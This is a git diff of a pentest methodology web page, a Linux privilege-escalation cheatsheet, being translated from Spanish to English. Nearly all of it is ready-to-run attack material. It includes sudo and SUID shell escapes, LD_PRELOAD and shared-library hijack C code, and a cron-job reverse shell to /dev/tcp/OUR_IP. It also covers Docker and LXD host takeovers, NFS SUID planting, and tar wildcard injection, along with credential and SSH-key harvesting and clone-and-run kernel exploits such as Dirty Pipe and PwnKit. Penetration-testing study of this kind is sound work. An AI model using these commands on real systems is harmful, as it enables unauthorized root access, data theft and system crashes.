@@ -1,52 +1,41 @@
 ---
 title: "Linux PrivEsc"
-description: "SUID, sudo, cron jobs, capabilities y exploits de kernel."
+description: "SUID, sudo, cron jobs, capabilities, and kernel exploits."
 sidebar:
   order: 2
   label: "Linux PrivEsc"
 ---
-
-<aside class="my-8 p-5 rounded-lg border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose shadow-lg backdrop-blur-sm">
-  <div class="text-xs uppercase tracking-widest text-[#cba6f7] font-bold mb-2 font-mono flex items-center gap-2">
-    <span class="inline-block w-2 h-2 rounded-full bg-[#cba6f7] animate-pulse"></span>
-    Language Fallback · Contenido en Español
-  </div>
-  <p class="text-sm text-zinc-300 leading-relaxed">
-    This methodology cheatsheet is currently written in Spanish. Technical command syntaxes, cheatsheets, and checklists remain highly readable. You can switch back to Spanish at any time using the language toggle above.
-  </p>
-</aside>
-
-> Técnicas para escalar de usuario de bajo privilegio a root en Linux: enumeración, abuso de SUID/capabilities/sudo, contenedores, kernel exploits y library hijacking.
+> Techniques to escalate from a low-privilege user to root in Linux: enumeration, abusing SUID/capabilities/sudo, containers, kernel exploits, and library hijacking.
 
 ---
 
 
-## Enumeración — Sistema y usuarios
+## Enumeration — System and Users
 
 ```bash
-# Identidad y grupos
+# Identity and groups
 whoami; id; groups
-sudo -l                                    # ← SIEMPRE empezar aquí
+sudo -l                                    # ← ALWAYS start here
 
-# Sistema
+# System
 uname -a                                   # kernel + arch
 cat /proc/version
 cat /etc/os-release; cat /etc/lsb-release
 
-# Procesos y servicios
+# Processes and services
 ps aux
-ps aux | grep root                         # procesos corriendo como root
+ps aux | grep root                         # processes running as root
 
-# Variables de entorno
+# Environment variables
 env; set
 
-# Historial y archivos de configuración
+# History and configuration files
 history
 cat ~/.bash_history
 ls -la ~/
 cat ~/.bashrc ~/.bash_profile ~/.profile
 
-# Red
+# Network
 hostname -I; ip a; ifconfig
 netstat -antp; ss -antp
 cat /etc/hosts
@@ -57,45 +46,45 @@ cat /etc/hosts
 ## Credential Hunting
 
 ```bash
-# Archivos de configuración con credenciales
+# Configuration files with credentials
 find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
 find / -name "wp-config.php" -o -name "config.php" 2>/dev/null
 find / -name ".env" 2>/dev/null
 cat /var/www/html/wp-config.php
 
-# Claves SSH
+# SSH keys
 find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
 ls -la ~/.ssh/
 cat ~/.ssh/id_rsa
 
-# Archivos world-readable potencialmente sensibles
+# Potentially sensitive world-readable files
 find / -not \( -path /proc -prune \) -not \( -path /sys -prune \) \
   -name "*.txt" -o -name "*.log" 2>/dev/null | xargs grep -i "password\|passwd\|secret" 2>/dev/null
 
-# Bases de datos
+# Databases
 find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
 
-# Historial de comandos de todos los usuarios
+# Command history of all users
 find /home -name ".bash_history" 2>/dev/null | xargs cat 2>/dev/null
 cat /root/.bash_history 2>/dev/null
 ```
 
 ---
 
-## Sudo — Abuso de permisos
+## Sudo — Permission Abuse
 
 ```bash
-sudo -l    # ver qué podemos ejecutar como root
+sudo -l    # see what we can run as root
 
-# GTFOBins — buscar el binario en https://gtfobins.github.io/#
-# Ejemplos:
+# GTFOBins — search for the binary at https://gtfobins.github.io/
+# Examples:
 sudo find . -exec /bin/sh \; -quit
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo python3 -c 'import os; os.system("/bin/sh")'
 sudo vim -c ':!/bin/sh'
-sudo less /etc/passwd    # luego !/bin/sh
+sudo less /etc/passwd    # then !/bin/sh
 
-# LD_PRELOAD (si sudo -l muestra env_keep+=LD_PRELOAD)
+# LD_PRELOAD (if sudo -l shows env_keep+=LD_PRELOAD)
 cat > /tmp/root.c << 'EOF'
 #include <stdio.h>
 #include <sys/types.h>
@@ -108,17 +97,17 @@ void _init() {
 }
 EOF
 gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
-sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart   # cualquier binario sudo
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart   # any sudo binary
 
 # CVE-2021-3156 (sudo < 1.9.3 — Baron Samedit)
-sudo -V | head -n1    # verificar versión
+sudo -V | head -n1    # verify version
 git clone https://github.com/blasty/CVE-2021-3156.git
 cd CVE-2021-3156 && make
-./sudo-hax-me-a-sandwich    # seleccionar target OS
+./sudo-hax-me-a-sandwich    # select target OS
 ./sudo-hax-me-a-sandwich 1  # 0=Ubuntu 18.04 / 1=Ubuntu 20.04 / 2=Debian 10
 
 # CVE-2019-14287 (sudo < 1.8.28 — -u#-1 bypass)
-sudo -u#-1 id    # → uid=0(root) — si el usuario puede correr sudo
+sudo -u#-1 id    # → uid=0(root) — if the user can run sudo
 ```
 
 ---
@@ -126,28 +115,28 @@ sudo -u#-1 id    # → uid=0(root) — si el usuario puede correr sudo
 ## SUID / SGID
 
 ```bash
-# Buscar binarios SUID
+# Search for SUID binaries
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 find / -perm -4000 2>/dev/null
 
-# Buscar binarios SGID
+# Search for SGID binaries
 find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
 
-# GTFOBins para el binario encontrado
-# Ejemplos comunes:
-/bin/bash -p           # si bash tiene SUID → shell como owner
-python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'  # si python SUID
+# GTFOBins for the found binary
+# Common examples:
+/bin/bash -p           # if bash is SUID → shell as owner
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'  # if python is SUID
 ```
 
-### Shared Object Hijacking (SUID + RUNPATH writable)
+### Shared Object Hijacking (SUID + Writable RUNPATH)
 
 ```bash
-# Identificar biblioteca no estándar
+# Identify non-standard library
 ldd /path/to/suid_binary
-readelf -d /path/to/suid_binary | grep PATH    # buscar RUNPATH writable
+readelf -d /path/to/suid_binary | grep PATH    # search for writable RUNPATH
 
-# Si /development (u otro path) es writable:
-# Crear biblioteca maliciosa con la función requerida
+# If /development (or another path) is writable:
+# Create malicious library with the required function
 ./suid_binary    # → error: undefined symbol: dbquery
 cat > /tmp/src.c << 'EOF'
 #include <stdlib.h>
@@ -163,21 +152,21 @@ gcc /tmp/src.c -fPIC -shared -o /development/libshared.so
 ## Linux Capabilities
 
 ```bash
-# Enumerar capabilities
+# Enumerate capabilities
 find /usr/bin /usr/sbin /usr/local/bin -type f -exec getcap {} \; 2>/dev/null
-# También:
+# Or:
 getcap -r / 2>/dev/null
 
-# cap_setuid → setuid(0) directo
-# Python con cap_setuid:
+# cap_setuid → direct setuid(0)
+# Python with cap_setuid:
 python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
-# cap_dac_override → ignorar permisos de lectura/escritura
-# vim con cap_dac_override para editar /etc/passwd:
+# cap_dac_override → ignore read/write permissions
+# vim with cap_dac_override to edit /etc/passwd:
 echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
-su    # sin contraseña de root
+su    # without root password
 
-# cap_sys_admin → montar filesystems (ver Docker/LXD)
+# cap_sys_admin → mount filesystems (see Docker/LXD)
 ```
 
 ---
@@ -185,56 +174,56 @@ su    # sin contraseña de root
 ## Cron Jobs
 
 ```bash
-# Ver crontabs
+# View crontabs
 cat /etc/crontab
 ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.d/
 crontab -l
 
-# Monitorear procesos en tiempo real con pspy
-./pspy64 -pf -i 1000    # -pf: procesos + FS events / -i 1000ms scan
+# Monitor processes in real time with pspy
+./pspy64 -pf -i 1000    # -pf: processes + FS events / -i 1000ms scan
 
-# Buscar archivos world-writable (potencial script de cron)
+# Search for world-writable files (potential cron script)
 find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
-# Si el script es writable → append reverse shell
+# If the script is writable → append reverse shell
 echo 'bash -i >& /dev/tcp/OUR_IP/443 0>&1' >> /dmz-backups/backup.sh
-nc -lnvp 443    # esperar la conexión del cron job
+nc -lnvp 443    # wait for the cron job connection
 ```
 
 ---
 
-## Docker / Contenedores
+## Docker / Containers
 
-### Docker Group (usuario en grupo docker)
+### Docker Group (User in docker Group)
 
 ```bash
-id    # verificar: groups=...,116(docker)
+id    # verify: groups=...,116(docker)
 
-# Montar root del host en /mnt del contenedor
+# Mount the host root at /mnt inside the container
 docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
-# → root shell con acceso a todo el host
+# → root shell with access to the entire host
 
-# Vía socket Docker writable
+# Via writable Docker socket
 docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
 ```
 
-### Docker Socket dentro de contenedor
+### Docker Socket inside a Container
 
 ```bash
-ls -la /var/run/docker.sock    # si writable sin ser root
+ls -la /var/run/docker.sock    # if writable without being root
 
-# Descargar docker binary si no está
+# Download docker binary if not present
 wget https://parrot-os/docker -O /tmp/docker && chmod +x /tmp/docker
 
-# Listar contenedores
+# List containers
 /tmp/docker -H unix:///app/docker.sock ps
 
-# Crear contenedor privilegiado que monta el host
+# Create a privileged container that mounts the host
 /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
 
-# Ejecutar bash en el nuevo contenedor
+# Execute bash in the new container
 /tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
-cat /hostsystem/root/.ssh/id_rsa    # SSH key de root del host
+cat /hostsystem/root/.ssh/id_rsa    # SSH key of the host's root
 ```
 
 ---
@@ -242,20 +231,20 @@ cat /hostsystem/root/.ssh/id_rsa    # SSH key de root del host
 ## LXC / LXD Escalation
 
 ```bash
-id    # grupos=...,116(lxd) o 116(lxc)
+id    # groups=...,116(lxd) or 116(lxc)
 
-# Importar imagen (si hay ubuntu-template.tar.xz en el sistema)
+# Import image (if ubuntu-template.tar.xz is on the system)
 lxc image import ubuntu-template.tar.xz --alias ubuntutemp
 lxc image list
 
-# Crear contenedor privilegiado + montar filesystem del host
+# Create privileged container + mount host filesystem
 lxc init ubuntutemp privesc -c security.privileged=true
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 
-# Iniciar y obtener shell root
+# Start and obtain root shell
 lxc start privesc
 lxc exec privesc /bin/bash
-ls /mnt/root    # filesystem del host accesible como root
+ls /mnt/root    # host filesystem accessible as root
 cat /mnt/root/root/.ssh/id_rsa
 ```
 
@@ -264,13 +253,13 @@ cat /mnt/root/root/.ssh/id_rsa
 ## NFS — no_root_squash
 
 ```bash
-# Desde Pwnbox — ver exports del target
+# From Pwnbox — view target exports
 showmount -e TARGET_IP
 
-# Si /tmp o cualquier share tiene no_root_squash:
-cat /etc/exports    # buscar no_root_squash
+# If /tmp or any share has no_root_squash:
+cat /etc/exports    # search for no_root_squash
 
-# Desde Pwnbox como root: crear SUID binary y copiarlo al share NFS
+# From Pwnbox as root: create SUID binary and copy it to the NFS share
 cat > /tmp/shell.c << 'EOF'
 #include <stdio.h>
 #include <sys/types.h>
@@ -283,8 +272,8 @@ sudo mount -t nfs TARGET_IP:/tmp /mnt
 cp /tmp/shell /mnt/
 chmod u+s /mnt/shell
 
-# En el target (como usuario low-priv)
-/tmp/shell    # → bash como root (uid=0)
+# On the target (as low-priv user)
+/tmp/shell    # → bash as root (uid=0)
 ```
 
 ---
@@ -292,17 +281,17 @@ chmod u+s /mnt/shell
 ## Path Hijacking
 
 ```bash
-# Verificar si . está en PATH
-echo $PATH    # si empieza con .: → vulnerable
+# Check if . is in PATH
+echo $PATH    # if it starts with .: → vulnerable
 
-# Crear binario malicioso con el nombre del comando buscado
+# Create malicious binary with the name of the searched command
 export PATH=.:${PATH}
 cat > ls << 'EOF'
 #!/bin/bash
 /bin/bash
 EOF
 chmod +x ls
-# Si algún script SUID llama a "ls" sin ruta absoluta → root shell
+# If any SUID script calls "ls" without an absolute path → root shell
 ```
 
 ---
@@ -310,13 +299,13 @@ chmod +x ls
 ## Wildcard Abuse (tar --checkpoint)
 
 ```bash
-# En directorio donde cron ejecuta: tar * o tar /path/to/dir/*
+# In directory where cron runs: tar * or tar /path/to/dir/*
 echo 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' > /tmp/root.sh
 chmod +x /tmp/root.sh
 cd /path/donde/cron/hace/tar
 echo "" > "--checkpoint-action=exec=sh /tmp/root.sh"
 echo "" > --checkpoint=1
-# Esperar ejecución del cron → /tmp/rootbash -p → root
+# Wait for cron execution → /tmp/rootbash -p → root
 /tmp/rootbash -p
 ```
 
@@ -324,10 +313,10 @@ echo "" > --checkpoint=1
 
 ## Shared Library Hijacking
 
-### LD_PRELOAD (vía sudo con env_keep)
+### LD_PRELOAD (via sudo with env_keep)
 
 ```bash
-# Requiere: sudo -l muestra env_keep+=LD_PRELOAD y algún binario sudo
+# Requires: sudo -l shows env_keep+=LD_PRELOAD and some sudo binary
 gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
 sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 ```
@@ -335,17 +324,17 @@ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 ### Python Library Hijacking
 
 ```bash
-# 1. Encontrar script SUID o sudo que importa módulo Python
+# 1. Find SUID or sudo script that imports Python module
 ls -l /path/script.py    # -rwsrwxr-x (SUID)
 grep import script.py    # import psutil
 
-# 2. Verificar permisos del módulo
+# 2. Check module permissions
 grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/
 ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-# Si world-writable → editar y añadir: import os; os.system('id')
+# If world-writable → edit and add: import os; os.system('id')
 
-# 3. Hijacking vía PYTHONPATH (si sudo SETENV: /usr/bin/python3)
-# Crear psutil.py falso en /tmp/
+# 3. Hijacking via PYTHONPATH (if sudo SETENV: /usr/bin/python3)
+# Create fake psutil.py in /tmp/
 cat > /tmp/psutil.py << 'EOF'
 import os
 def virtual_memory():
@@ -356,22 +345,22 @@ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py    # → root shell
 
 ---
 
-## Grupos especiales
+## Special Groups
 
 ```bash
-# Grupo disk → acceso directo a dispositivos de bloque
-df -h                        # identificar disco
-debugfs /dev/sda1            # abrir con debugfs
+# disk group → direct access to block devices
+df -h                        # identify disk
+debugfs /dev/sda1            # open with debugfs
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 
-# Grupo adm → leer logs del sistema
-cat /var/log/apache2/access.log    # credenciales en logs
+# adm group → read system logs
+cat /var/log/apache2/access.log    # credentials in logs
 cat /var/log/auth.log
 zcat /var/log/syslog.*.gz
 
-# Grupo lxd/lxc → ver sección LXD arriba
-# Grupo docker → ver sección Docker arriba
+# lxd/lxc group → see LXD section above
+# docker group → see Docker section above
 ```
 
 ---
@@ -379,15 +368,15 @@ zcat /var/log/syslog.*.gz
 ## tmux Session Hijacking
 
 ```bash
-# Verificar sesiones tmux corriendo como root
+# Verify tmux sessions running as root
 ps aux | grep tmux
 
-# Verificar permisos del socket
+# Verify socket permissions
 ls -la /shareds    # srw-rw---- 1 root devs 0
 
-# Si somos del grupo devs:
+# If we are in the devs group:
 id    # groups=...,1011(devs)
-tmux -S /shareds    # → adjuntar a sesión root
+tmux -S /shareds    # → attach to root session
 ```
 
 ---
@@ -396,32 +385,32 @@ tmux -S /shareds    # → adjuntar a sesión root
 
 ```bash
 screen -v    # Screen version 4.05.00 (GNU) 10-Dec-16
-# Exploit requiere compilar dos .so en /tmp y escribir en /etc/ld.so.preload vía -L
-# Script disponible públicamente como screen_exploit.sh
+# Exploit requires compiling two .so in /tmp and writing to /etc/ld.so.preload via -L
+# Script publicly available as screen_exploit.sh
 ./screen_exploit.sh    # → uid=0(root)
 ```
 
 ---
 
-## Kernel Exploits / CVEs conocidos
+## Kernel Exploits / Known CVEs
 
 ```bash
-# Identificar versión
+# Identify version
 uname -r
 cat /etc/lsb-release
 
-# Dirty Pipe (CVE-2022-0847) — kernels 5.8 a 5.17
-# Permite escribir en archivos root con solo acceso de lectura
+# Dirty Pipe (CVE-2022-0847) — kernels 5.8 to 5.17
+# Allows writing to root files with only read access
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
 cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
-./exploit-1    # modifica /etc/passwd → contraseña root = "piped"
-su             # contraseña: piped → root
+./exploit-1    # modifies /etc/passwd → root password = "piped"
+su             # password: piped → root
 
-# exploit-2: requiere SUID binary existente
+# exploit-2: requires existing SUID binary
 find / -perm -4000 2>/dev/null
 ./exploit-2 /usr/bin/sudo    # → root shell
 
-# PwnKit (CVE-2021-4034) — pkexec — prácticamente universal
+# PwnKit (CVE-2021-4034) — pkexec — practically universal
 git clone https://github.com/arthepsy/CVE-2021-4034.git
 cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc
 ./poc    # → root shell
@@ -430,90 +419,90 @@ cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc
 wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
 gcc -m32 -static exploit.c -o exploit && ./exploit
 
-# Netfilter CVE-2022-25636 (kernels 5.4-5.6.10) — puede corromper kernel
+# Netfilter CVE-2022-25636 (kernels 5.4-5.6.10) — can crash kernel
 git clone https://github.com/Bonfee/CVE-2022-25636.git && make && ./exploit
 
 # Netfilter CVE-2023-32233 (kernel ≤ 6.3.1 — nf_tables UAF)
 git clone https://github.com/Liuk3r/CVE-2023-32233
 gcc -Wall -o exploit exploit.c -lmnl -lnftnl && ./exploit
 
-# Dirty COW (CVE-2016-5195) — kernels muy antiguos
-# Buscar PoC en https://github.com/dirtycow/dirtycow.github.io
+# Dirty COW (CVE-2016-5195) — very old kernels
+# Search for PoC at https://github.com/dirtycow/dirtycow.github.io
 
-# Kernel genérico
-uname -r    # buscar en Google: "linux <versión> exploit"
+# Generic Kernel
+uname -r    # search Google: "linux <version> exploit"
 gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
 ./kernel_exploit
 ```
 
 ---
 
-## Herramientas de enumeración automatizada
+## Automated Enumeration Tools
 
 ```bash
-# linPEAS (más completo)
+# linPEAS (most comprehensive)
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-# o transferir y ejecutar:
+# or transfer and run:
 ./linpeas.sh | tee /tmp/linpeas.out
 
-# pspy — monitorear procesos sin root
+# pspy — monitor processes without root
 ./pspy64 -pf -i 1000
 
 # LinEnum
-./LinEnum.sh -t    # -t: tests exhaustivos
+./LinEnum.sh -t    # -t: thorough tests
 
 # linux-exploit-suggester
 ./linux-exploit-suggester.sh
 
-# Lynis (auditoría de hardening)
+# Lynis (hardening audit)
 ./lynis audit system
 ```
 
 ---
 
-## Checklist rápido (orden de prioridad)
+## Quick Checklist (Order of Priority)
 
 ```
-□ sudo -l           → ¿binary directo en GTFOBins? ¿LD_PRELOAD?
+□ sudo -l           → direct binary in GTFOBins? LD_PRELOAD?
 □ SUID binaries     → find / -perm -4000 → GTFOBins
-□ Capabilities      → getcap -r / → cap_setuid en Python?
-□ Cron (pspy64)     → ¿script writable que corre como root?
-□ Grupos especiales → docker / lxd / disk / adm
-□ /etc/exports      → no_root_squash → SUID desde Pwnbox
+□ Capabilities      → getcap -r / → cap_setuid in Python?
+□ Cron (pspy64)     → writable script running as root?
+□ Special groups    → docker / lxd / disk / adm
+□ /etc/exports      → no_root_squash → SUID from Pwnbox
 □ NFS shares        → showmount -e TARGET
-□ Writable scripts  → find / -perm -o+w → PATH en script SUID
+□ Writable scripts  → find / -perm -o+w → PATH in SUID script
 □ sudo CVEs         → sudo -V → 1.8.28? 1.9.3?
 □ Kernel CVEs       → uname -r → Dirty Pipe? PwnKit? Netfilter?
 □ Python/SO hijack  → sudo SETENV + python? RUNPATH writable?
 □ Tmux sessions     → ps aux | grep tmux → socket writable?
-□ Credenciales      → .bash_history, configs, .env, .ssh
+□ Credentials       → .bash_history, configs, .env, .ssh
 ```
 
 ---
 
 ## Pitfalls / Gotchas
 
-- **sudo -l requiere contraseña a veces** → con `-S` se puede pasar via pipe pero si no tenemos pass, probar otras técnicas primero.
-- **GTFOBins no siempre aplica** → verificar flags exactos: `sudo find` vs `sudo find . -exec /bin/sh \; -quit` son muy diferentes.
-- **LD_PRELOAD solo funciona si `env_keep+=LD_PRELOAD` aparece en sudo -l** → si está en `env_reset` sin excepción, no funciona.
-- **SUID en scripts de bash** → Linux ignora el SUID bit en scripts interpretados (bash, python). Solo aplica a binarios compilados.
-- **getcap necesita ruta completa** → `getcap -r /` escanea todo pero puede tardar. Limitar a `/usr/bin /usr/sbin /usr/local/bin`.
-- **pspy necesita permisos de ejecución** → `chmod +x pspy64` antes de ejecutar; transferir si no está en el target.
-- **NFS no_root_squash** → se necesita ser root en Pwnbox para crear el SUID binary y montarlo. Sin acceso root en Pwnbox, no funciona.
-- **Kernel exploits pueden colgar el sistema** → los CVEs de Netfilter son especialmente inestables. Advertir al cliente; no usar en producción sin autorización.
-- **Dirty Pipe requiere lectura del archivo** → necesita permiso de lectura (r) en el archivo a modificar (ej. `/etc/passwd`).
-- **PwnKit (CVE-2021-4034) es casi universal** → afecta a pkexec desde 2009. Intentarlo si otras técnicas fallan.
-- **Docker socket writable** → `ls -la /var/run/docker.sock` y verificar que el grupo sea writable por nuestro usuario.
-- **LXD sin imagen local** → buscar `.tar.xz` en el sistema con `find / -name "*.tar.xz" 2>/dev/null`. Si no hay, transferir alpine desde Pwnbox.
-- **Shared object hijacking**: el nombre del archivo de la biblioteca debe coincidir exactamente con el que busca el binario, y la función exportada también.
-- **Python library path**: `python3 -c 'import sys; print("\n".join(sys.path))'` muestra el orden de búsqueda. El directorio writable debe estar ANTES del directorio real del módulo.
+- **sudo -l sometimes requires a password** → it can be passed via pipe with `-S`, but if we don't have the password, try other techniques first.
+- **GTFOBins does not always apply** → verify exact flags: `sudo find` vs `sudo find . -exec /bin/sh \; -quit` are very different.
+- **LD_PRELOAD only works if `env_keep+=LD_PRELOAD` appears in sudo -l** → if it is in `env_reset` without exception, it won't work.
+- **SUID in Bash scripts** → Linux ignores the SUID bit on interpreted scripts (bash, python). Only applies to compiled binaries.
+- **getcap needs full path** → `getcap -r /` scans everything but can take a while. Limit to `/usr/bin /usr/sbin /usr/local/bin`.
+- **pspy needs execution permissions** → `chmod +x pspy64` before running; transfer it if it's not on the target.
+- **NFS no_root_squash** → you need to be root on the Pwnbox to create the SUID binary and mount it. Without root access on Pwnbox, it does not work.
+- **Kernel exploits can crash the system** → Netfilter CVEs are especially unstable. Warn the client; do not use in production without authorization.
+- **Dirty Pipe requires read access to the file** → it requires read permission (r) on the file to be modified (e.g., `/etc/passwd`).
+- **PwnKit (CVE-2021-4034) is almost universal** → it affects pkexec since 2009. Attempt it if other techniques fail.
+- **Writable Docker socket** → `ls -la /var/run/docker.sock` and verify that the group is writable by our user.
+- **LXD without a local image** → search for `.tar.xz` on the system with `find / -name "*.tar.xz" 2>/dev/null`. If none are found, transfer Alpine from Pwnbox.
+- **Shared object hijacking**: the library filename must exactly match the one searched for by the binary, as must the exported function.
+- **Python library path**: `python3 -c 'import sys; print("\n".join(sys.path))'` shows the search order. The writable directory must be BEFORE the real module directory.
 
 ---
 
-## Cheatsheets relacionados
+## Related Cheatsheets
 
-- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — técnicas equivalentes para Windows
-- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — tras root local, pivotar a AD
-- [File Transfers](/en/metodologias/privesc/file-transfers/) — transferir linPEAS, pspy, exploits al target
-- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells para los cron jobs y exploits
-- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — post-explotación tras privesc
+- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — equivalent techniques for Windows
+- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — after local root, pivot to AD
+- [File Transfers](/en/metodologias/privesc/file-transfers/) — transfer linPEAS, pspy, and exploits to the target
+- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells for cron jobs and exploits
+- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — post-exploitation after privesc
